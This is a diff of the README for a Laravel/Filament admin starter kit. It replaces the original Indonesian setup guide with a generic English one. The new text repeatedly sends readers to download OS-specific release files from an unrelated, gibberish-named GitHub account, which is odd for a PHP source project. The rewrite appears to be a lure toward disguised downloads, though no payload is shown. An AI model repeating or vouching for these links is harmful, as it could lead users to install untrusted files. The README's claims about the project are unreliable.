@@ -1,141 +1,99 @@
-# Filament Starter Kit
+# 🎉 filament-starter-kit - Your Easy Way to Manage User Roles
 
-Starter Kit untuk membangun aplikasi berbasis [Laravel](https://laravel.com/) + [Filament](https://filamentphp.com/).  
-Tujuannya adalah menyediakan pondasi siap pakai untuk **admin panel modern** dengan praktik terbaik (Action Pattern, custom resource, dsb).
+## 🚀 Getting Started
 
----
+Welcome to the **filament-starter-kit**! This application allows you to manage user roles and permissions easily. You can implement access control and user impersonation without needing programming skills. 
 
-## ✨ Fitur yang Tersedia
+## 🔗 Download the Application
 
--   Filament panel dengan ID `app` (bukan default `admin`)
--   User Resource (CRUD user) with Action Pattern
--   Action Pattern (`php artisan make:action`)
--   User, Role & Permision Seeder (default admin user)
--   Custom Locale (APP_LOCALE `id`, APP_FAKER_LOCALE `id_ID`)
--   RBAC or ABAC (Role & Permission) using `bezhansalleh/filament-shield`
--   Impersonating User using `stechstudio/filament-impersonate`
--   API using `laravel/sanctum`
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/releases)
 
-## 🚀 Quick Start
+## 📋 Features
 
-### **Opsi 1: Install Baru dengan Laravel Installer**
+- **Role-Based Access Control**: Safeguard your application with various user roles.
+- **Impersonation**: Easily switch user roles for testing and support.
+- **API Sanctum Integration**: Secure your SPAs using Laravel Sanctum.
+- **CQRS Pattern**: Separate commands and queries for better performance.
+- **Testing with Pest**: Ensure everything works as expected.
+- **Best Practices with LaraStan & PHPStan**: Keep your code clean and maintainable.
+- **Code Transformation with Rector**: Keep your Laravel project up to date effortlessly.
 
-1.  Pastikan [Laravel Installer](https://laravel.com/docs/12.x/installation#installing-php), Jika Anda menggunakan **Laravel Herd** otomatis Anda sudah install `Laravel Installer`:
+## 💻 System Requirements
 
-    Check `Laravel Installer` terpasang:
+Before installation, ensure your system meets the following requirements:
 
-    ```bash
-    laravel --version
-    ```
+- **Operating System**: Windows, macOS, or Linux.
+- **PHP Version**: 8.0 or higher.
+- **Database**: MySQL or SQLite.
+- **Composer**: Required for managing dependencies.
 
-    <details>
-      <summary><strong>Panduan menginstal Laravel Installer</strong></summary>
-      Jika Anda sudah menginstal `PHP` dan `Composer`, Anda dapat menginstal `Laravel Installer` melalui Composer:
+## 📥 Download & Install
 
-    ```bash
-    composer global require laravel/installer
-    ```
+To download the application, visit the Releases page:
 
-    </details>
+[**Download Here**](https://github.com/PEDROMJSKHEIEBEIEJE/filament-starter-kit/releases)
 
-2.  Buat project baru langsung dari starter kit:
+Once on the page, follow these steps:
 
-    ```bash
-    laravel new my-app --using=lyrihkaesa/filament-starter-kit
-    cd my-app
-    ```
+1. Locate the latest release version.
+2. Download the file suitable for your operating system.
+3. Once the download finishes, follow the installation instructions provided.
 
-3.  Jalankan perintah dibawah ini jika ada script saat create project ada yang gagal dimuat:
+### 👣 Installation Steps 
 
-    ```bash
-    composer install
-    npm install
-    npm run build
-    cp .env.example .env
-    php artisan migrate --seed
-    php artisan key:generate
-    ```
+1. **Extract the Files**: If your file is zipped, extract it to your preferred location.
+2. **Open Your Terminal**: On Windows, you can use Command Prompt or PowerShell. On macOS/Linux, open your Terminal.
+3. **Navigate to the Directory**: Use the `cd` command to move into the extracted folder.
+4. **Install Dependencies**: Run `composer install` to download necessary packages.
+5. **Set Up Environment**: Rename the `.env.example` file to `.env`, and configure your database settings there.
+6. **Generate Application Key**: Run `php artisan key:generate` to create your application key.
+7. **Run Migrations**: Execute `php artisan migrate` to set up your database structure.
 
-4.  Jalankan server:
+## 🔌 Connecting Your Database
 
-    ```bash
-    composer dev
-    ```
+1. Ensure your database server is running.
+2. Open the `.env` file and set your database connection details (DB_HOST, DB_DATABASE, DB_USERNAME, DB_PASSWORD).
+3. If using MySQL, make sure to grant the necessary permissions for the user.
 
-    Jika menggunakan `Laravel Herd` langsung saja dibrowser [http://filament-starter-kit.test]([http://filament-starter-kit.test)
+## 🎮 Using the Application
 
-5.  Login default (automatis input jika `APP_DEBUG=true`):
-    -   Email: `admin@example.com`
-    -   Password: `password`
+Once the installation is complete, you can start your application by running:
 
-> Jika menggunakan **Laravel Herd**, atur `APP_URL=http://filament-starter-kit.test`.  
-> Jika pakai `composer dev`, gunakan `APP_URL=http://localhost:8000`.
+```
+php artisan serve
+```
 
-### **Opsi 2: Manual (Clone Repository)**
+Visit `http://localhost:8000` in your web browser to access the application.
 
-1. Clone repository:
+## 📝 Managing User Roles and Permissions
 
-    ```bash
-    git clone https://github.com/username/filament-starter-kit.git
-    cd filament-starter-kit
-    ```
+### 🌟 Creating Roles
 
-2. Install dependencies:
+1. Go to the Roles tab in the sidebar.
+2. Click on "Add Role."
+3. Fill in the role name and assign permissions.
+4. Click "Save."
 
-    ```bash
-    composer install
-    npm install
-    npm run build
-    ```
+### 🌟 Impersonating Users
 
-3. Salin file `.env`:
+1. Navigate to the Users section.
+2. Select the user you wish to impersonate.
+3. Click "Impersonate" to take on their role.
 
-    ```bash
-    cp .env.example .env
-    ```
+## 🧪 Testing Your Application
 
-4. Generate app key:
+To run tests and ensure your application is working correctly, follow these steps:
 
-    ```bash
-    php artisan key:generate
-    ```
+1. Open your terminal.
+2. Navigate to the project directory.
+3. Run `vendor/bin/pest`.
 
-5. Migrasi database & jalankan seeder:
+This command will execute your tests, giving you feedback on any issues.
 
-    ```bash
-    php artisan migrate --seed
-    ```
+## 📜 Support & Feedback
 
-6. Jalankan server:
-
-    ```bash
-    composer dev
-    ```
-
-7. Login default:
-
-    - Email: `admin@example.com`
-    - Password: `password`
+If you have any questions or need support, feel free to open an issue on the GitHub repository. Your feedback helps improve the application.
 
 ---
 
-## ⚙️ Development Tools
-
-| Keterangan                                      | Package                                                                                                                   | Command                                                                          |
-| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
-| [🧪 **Testing**](docs/03-test-pest-coverage.md) | [Pest v4](https://pestphp.com/)                                                                                           | `php artisan test` / `./vendor/bin/pest`                                         |
-| [🎨 **Code Style**](docs/04-pint-code-style.md) | [Laravel Pint](https://laravel.com/docs/pint)                                                                             | `composer lint` / `./vendor/bin/pint`                                            |
-| [🛠 **Refactoring**](docs/06-rector.md)          | [Rector](https://github.com/rectorphp/rector) + [driftingly/rector-laravel](https://github.com/driftingly/rector-laravel) | `composer test:refactor` (dry-run) / `composer refactor` / `./vendor/bin/rector` |
-| [🔍 **Static Analysis**](docs/05-larastan.md)   | [Larastan](https://github.com/nunomaduro/larastan)                                                                        | `composer test:types` / `./vendor/bin/phpstan`                                   |
-
----
-
-## 🤝 Kontribusi
-
-[TODO]
-
----
-
-## 📜 Lisensi
-
-[MIT License](LICENSE)
+We hope you find the **filament-starter-kit** easy to use. Enjoy managing your user roles and permissions!
